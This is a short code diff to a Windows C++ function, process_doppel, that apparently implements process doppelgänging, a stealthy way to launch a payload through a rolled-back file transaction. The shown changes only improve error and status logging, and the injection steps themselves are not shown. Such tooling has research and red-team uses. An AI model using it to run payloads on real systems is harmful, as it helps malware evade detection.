@@ -232,7 +232,7 @@ bool process_doppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
     hTransactedFile = nullptr;
 
     if (RollbackTransaction(hTransaction) == FALSE) {
-        std::cerr << "RollbackTransaction failed: " << GetLastError() << std::endl;
+        std::cerr << "RollbackTransaction failed: " << std::hex << GetLastError() << std::endl;
         return false;
     }
     CloseHandle(hTransaction);
@@ -251,7 +251,10 @@ bool process_doppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
         FALSE //InJob
     );
     if (status != STATUS_SUCCESS) {
-        std::cerr << "NtCreateProcessEx failed" << std::endl;
+        std::cerr << "NtCreateProcessEx failed! Status: " << std::hex << status << std::endl;
+        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
+            std::cerr << "[!] The payload has mismatching bitness!" << std::endl;
+        }
         return false;
     }
 
@@ -284,8 +287,8 @@ bool process_doppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
         std::cerr << "Parameters setup failed" << std::endl;
         return false;
     }
+    std::cout << "[+] Process created! Pid = " << GetProcessId(hProcess) << "\n";
 #ifdef _DEBUG
-    std::cout << "Process created!" << std::endl;
     std::cerr << "EntryPoint at: " << (std::hex) << (ULONGLONG)procEntry << std::endl;
 #endif
     HANDLE hThread = NULL;
